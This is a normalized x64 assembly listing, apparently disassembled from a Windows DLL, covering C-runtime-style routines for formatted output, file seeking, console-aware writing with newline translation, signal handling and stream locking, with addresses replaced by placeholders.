or rdx 0xffffffffffffffff
lea rbx [ rax + rsi ]
cmp rdi rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rcx rbx
call sub_180027750
test eax eax
je r-xdata
mov rdx rdi
sub rdx rax
mov eax [ rsp + 0x44 ]
dec eax
cmp r12d eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d ebp
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_1800240d8
cmp eax ebp
jge r-xdata
test cl cl
je r-xdata
mov rax [ rsp + 0xd8 ]
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov [ rsp + 0x28 ] rax
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] 0x1
call sub_1800247e4
jmp r-xdata
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
mov [ rbx - 0x2 ] al
sub_180024b88
sub rsp 0x38
cmp r9d 0x65
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_18002430c
cmp r9d 0x45
je r-xdata
cmp r9d 0x66
jne r-xdata
cmp r9d 0x61
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_180024980
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180024404
jmp r-xdata
cmp r9d 0x41
je r-xdata
add rsp 0x38
retn
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180024a54
jmp r-xdata
sub_180024c44
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180024c7c
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
call sub_180018cdc
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180024cc4
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180018cdc
mov rax [ rsp + 0x20 ]
movzx r11d bl
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax 0x8000
cmp [ rsp + 0x38 ] 0x0
je r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180024d10
mov r11 rsp
mov [ r11 + 0x20 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x70
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov [ r11 - 0x50 ] r8
xor ebx ebx
mov rbp rdx
and [ rsp + 0x30 ] ebx
and [ rsp + 0x28 ] ebx
and [ rsp + 0x20 ] ebx
mov r8 rdx
mov rdi rcx
lea rdx [ r11 - 0x40 ]
lea rcx [ r11 - 0x38 ]
xor r9d r9d
call sub_180028540
mov esi eax
test al 0x4
je r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_1800279a8
test sil 0x2
jne r-xdata
and [ rsp + 0x40 ] 0x0
and [ rsp + 0x44 ] 0x0
mov ebx 0x200
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov ecx [ rsp + 0x48 ]
mov [ rdi ] ebx
mov rax rdi
sub ecx ebp
mov [ rdi + 0x4 ] ecx
mov rcx [ rsp + 0x40 ]
mov [ rdi + 0x10 ] rcx
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop rdi
pop rsi
pop rbp
retn
bts ebx 0x8
cmp eax 0x2
jne r-xdata
test sil 0x1
jne r-xdata
sub_180024e04
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_18001e29c
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_18001fee0
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_180022e38
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_180022d38
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_180025040
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_180028e50
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1800194ec
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_18001952c
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_1800250d8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180028ec4
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001950c
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_180025040
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180028f6c
mov rax rbx
jmp r-xdata
sub_1800251bc
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_180023d20
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_18001950c
and [ rax ] edi
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_180025a50
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_180025040
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_18001e320
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_1800194ec
mov [ rax ] 0x1c
call sub_18001950c
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_18001952c
jmp r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001950c
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
add rcx 0x2
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
movzx eax [ rbx ]
xor r12d r12d
cmp ax 0xa
mov [ rsp + 0x40 ] ax
sete r12b
add rbx 0x2
mov [ rsp + 0x4c ] r12d
jmp r-xdata
cmp sil 0x2
jne r-xdata
movsx ecx cl
call sub_180024cc4
test eax eax
je r-xdata
mov al [ r15 + rdx + 0x4c ]
mov [ rsp + 0x61 ] cl
mov r8d 0x2
mov [ rsp + 0x60 ] al
and [ r15 + rdx + 0x50 ] 0x0
lea rdx [ rsp + 0x60 ]
jmp r-xdata
mov r15 [ rsp + 0x60 ]
call [ GetLastError@IAT ]
mov ebx eax
add esi [ rsp + 0x48 ]
cmp r15d esi
jg r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov eax r12d
mov edx 0xd
sub eax r13d
cmp eax r14d
jb r-xdata
mov eax r12d
sub eax r13d
cmp eax r14d
jae r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
cmp sil 0x1
je r-xdata
mov r12d [ rsp + 0x4c ]
mov r8d 0x1
mov rdx rbx
mov rax r14
sub rax rbx
add rax r13
cmp rax 0x1
jle r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180029168
cmp eax 0xffffffff
je r-xdata
mov edi r12d
mov r8d 0xd
sub edi r13d
cmp edi r14d
jb r-xdata
mov rax [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
movsxd rcx esi
lea rdx [ rbp + rcx + 0x620 ]
mov r8d r15d
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov rax [ rsp + 0x60 ]
lea r9 [ rsp + 0x48 ]
mov rcx [ rax + rcx ]
sub r8d esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov r15d [ rsp + 0x44 ]
lea rsi [ rbp + 0x620 ]
xor ecx ecx
jmp r-xdata
movzx ecx [ rsp + 0x40 ]
call sub_180028f94
cmp ax [ rsp + 0x40 ]
jne r-xdata
cmp sil 0x2
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov ecx [ rsp + 0x5c ]
lea rax [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
inc rbx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r12d eax
test eax eax
je r-xdata
mov al [ rbx ]
lea rdx [ rw-data ]
inc edi
mov rcx [ rdx + r12 * 8 ]
mov [ r15 + rcx + 0x4c ] al
mov rax [ rdx + r12 * 8 ]
mov [ r15 + rax + 0x50 ] 0x1
lea rcx [ rsp + 0x40 ]
mov r8d 0x2
mov rdx rbx
call sub_180029168
cmp eax 0xffffffff
je r-xdata
lea rcx [ rsp + 0x70 ]
xor edx edx
cmp r15d esi
jg r-xdata
add edi 0x2
test r12d r12d
je r-xdata
mov r12 [ rsp + 0x50 ]
mov rcx [ rsp + 0x50 ]
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov rcx [ rax + rcx * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d r12d
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc rbx
jmp r-xdata
mov r12d 0xd
mov ecx r12d
mov [ rsp + 0x40 ] r12w
call sub_180028f94
cmp ax [ rsp + 0x40 ]
jne r-xdata
jmp r-xdata
mov edi ebx
sub edi r13d
add edi [ rsp + 0x44 ]
cmp [ rsp + 0x58 ] r12d
jl r-xdata
inc edi
inc [ rsp + 0x44 ]
cmp [ rsp + 0x4c ] 0x0
mov r12 [ rsp + 0x50 ]
je r-xdata
mov eax ebx
sub eax r13d
cmp eax r14d
jae r-xdata
and [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x60 ] 0xd
mov rcx [ rax + r12 * 8 ]
lea r9 [ rsp + 0x58 ]
lea rdx [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
mov r8d 0x1
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rsp + 0x58 ] 0x1
jl r-xdata
inc [ rsp + 0x44 ]
inc edi
jmp r-xdata
sub_18002591c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180028ec4
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001950c
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_1800251bc
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180028f6c
mov eax ebx
jmp r-xdata
sub_1800259fc
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_18001b71c
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_180025a50
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_180025ab8
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor ecx ecx
lea rdx [ rw-data ]
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_18001b79c
mov [ rw-data ] rax
test rax rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_18001b79c
mov [ rw-data ] rax
test rax rax
jne r-xdata
xor r8d r8d
lea rdx [ rw-data ]
lea r9d [ r8 + 0x3 ]
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
jmp r-xdata
mov [ rdx ] 0xfffffffe
cmp r10 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rdx 0x30
add rcx 0x8
dec rbx
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r8
lea r10 [ rw-data ]
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r10 + rax * 8 ]
imul rcx rcx 0x58
mov r10 [ rcx + rax ]
cmp r10 0xffffffffffffffff
je r-xdata
xor eax eax
test r10 r10
jne r-xdata
inc r8
add rdx 0x30
dec r9
jne r-xdata
sub_180025bc0
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_180022e38
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_180025c24
push rbx
sub rsp 0x20
mov rbx rdx
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_180022e38
bts [ rbx + 0x18 ] 0xf
add rsp 0x20
pop rbx
retn
sub_180025c58
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
btr [ rcx + 0x18 ] 0xf
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_180022d38
sub_180025d04
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_180018cdc
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_1800194ec
mov ebx 0x16
mov [ rax ] ebx
call sub_18001dab4
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_1800194ec
mov [ rax ] 0x2a
call sub_1800194ec
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_1800194ec
mov ebx 0x22
mov [ rax ] ebx
call sub_18001dab4
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_1800194ec
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_18001dab4
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18001d7d0
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_18001d7d0
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180025edc
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
dec [ rdx + 0x8 ]
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_18001db4c
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_180025f24
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
